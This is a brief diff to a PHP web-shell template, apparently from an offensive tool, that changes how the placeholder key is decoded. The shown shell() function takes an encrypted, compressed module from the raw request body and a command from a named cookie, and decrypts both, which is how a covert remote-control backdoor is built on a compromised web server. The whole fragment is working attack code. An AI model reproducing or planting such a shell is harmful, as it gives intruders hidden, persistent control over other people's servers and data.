@@ -19,7 +19,7 @@ function decrypt($key,$str){
 }
 function shell() {
 	@ob_start();
-	$key='{{key}}';
+	$key=pack('H*','{{key}}');
 	$mod=@gzuncompress(decrypt($key,pack('H*',@file_get_contents('php://input'))));
 	$cmd=@gzuncompress(decrypt($key,pack('H*',@$_COOKIE['{{action}}'])));
 	$tmp=tempnam(null,null);
